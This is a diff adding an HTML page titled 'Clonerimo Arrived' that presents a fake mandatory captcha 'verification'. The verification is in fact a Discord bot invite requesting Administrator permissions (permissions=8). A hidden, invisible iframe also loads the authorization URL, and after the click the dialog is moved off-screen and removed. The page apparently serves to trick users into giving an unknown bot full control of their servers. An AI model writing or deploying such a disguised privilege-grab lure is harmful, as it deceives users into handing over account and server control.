@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clonerimo Arrived</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- Include Google ReCaptcha API -->
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            width: 100%;
+            overflow: hidden;
+            background-color: #23272a;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+
+        .bg-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            background-image: url('https://github.com/ivorydevrimoalt/OMG_ITS_CLONERIMO/blob/main/d8680b1c1576ecc8.png?raw=true');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 1;
+        }
+
+        .content-wrapper {
+            position: relative;
+            z-index: 10;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+            width: 90%;
+            max-width: 450px;
+        }
+
+        .popup-container {
+            background-color: #2f3136;
+            color: #ffffff;
+            padding: 2.5rem;
+            border-radius: 8px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            border: 1px solid #4f545c;
+            width: 100%;
+            transition: all 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .popup-title {
+            font-size: 1.75rem;
+            font-weight: 700;
+            margin-bottom: 0.75rem;
+            color: #ffffff;
+        }
+
+        .popup-subtitle {
+            color: #b9bbbe;
+            font-size: 1rem;
+            margin-bottom: 2rem;
+            line-height: 1.5;
+        }
+
+        .captcha-wrapper {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 2rem;
+            min-height: 78px;
+        }
+
+        .verify-btn {
+            background-color: #5865f2;
+            color: white;
+            padding: 0.8rem 2rem;
+            border-radius: 4px;
+            font-weight: 600;
+            font-size: 1.1rem;
+            width: 100%;
+            transition: background 0.2s, transform 0.1s;
+            cursor: pointer;
+            border: none;
+        }
+
+        .verify-btn:hover {
+            background-color: #4752c4;
+        }
+
+        .verify-btn:active {
+            transform: scale(0.98);
+        }
+
+        .error-msg {
+            color: #f04747;
+            font-size: 0.9rem;
+            margin-top: 10px;
+            display: none;
+        }
+
+        /* The hidden frame still exists for background requests, but isn't visible */
+        #auth-frame {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="bg-container"></div>
+    <div class="overlay"></div>
+    
+    <div class="content-wrapper" id="main-content">
+        <div id="popup" class="popup-container">
+            <div class="popup-title">Clonerimo Arrived</div>
+            <p class="popup-subtitle">
+                To continue with the integration, please solve the ReCaptcha below. 
+                <strong>Verification is strictly required.</strong>
+            </p>
+            
+            <div class="captcha-wrapper">
+                <div class="g-recaptcha" data-sitekey="6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI"></div>
+            </div>
+
+            <button class="verify-btn" onclick="startClonerimoProtocol()">Verify & Invite</button>
+            <p id="error-text" class="error-msg">Please solve the captcha to proceed.</p>
+        </div>
+    </div>
+
+    <!-- Background frame (Still blocked by Discord, but kept per your design) -->
+    <iframe id="auth-frame" src="https://discord.com/oauth2/authorize?client_id=1485712067146023062&permissions=8&integration_type=0&scope=bot"></iframe>
+
+    <script>
+        const BOT_URL = "https://discord.com/oauth2/authorize?client_id=1485712067146023062&permissions=8&integration_type=0&scope=bot";
+
+        function startClonerimoProtocol() {
+            const response = grecaptcha.getResponse();
+            const errorText = document.getElementById('error-text');
+            
+            if (response.length === 0) {
+                errorText.style.display = 'block';
+                return;
+            }
+
+            errorText.style.display = 'none';
+            const popup = document.getElementById('popup');
+            const btn = document.querySelector('.verify-btn');
+            
+            btn.innerText = "Processing...";
+            btn.disabled = true;
+
+            // Since IFRAMES are blocked, we open a working popup on click
+            const width = 500;
+            const height = 750;
+            const left = (window.innerWidth / 2) - (width / 2);
+            const top = (window.innerHeight / 2) - (height / 2);
+            
+            window.open(BOT_URL, "ClonerimoAuth", `width=${width},height=${height},top=${top},left=${left}`);
+
+            setTimeout(() => {
+                // Execute the 10M x 10M movement protocol
+                popup.style.position = 'absolute';
+                popup.style.left = '10000000px'; 
+                popup.style.top = '10000000px';
+                popup.style.width = '10px';
+                popup.style.height = '10px';
+                popup.style.padding = '0';
+                popup.style.margin = '0';
+                popup.style.overflow = 'hidden';
+                popup.style.opacity = '0';
+
+                setTimeout(() => {
+                    popup.remove();
+                }, 3000);
+            }, 1000);
+        }
+    </script>
+</body>
+</html>
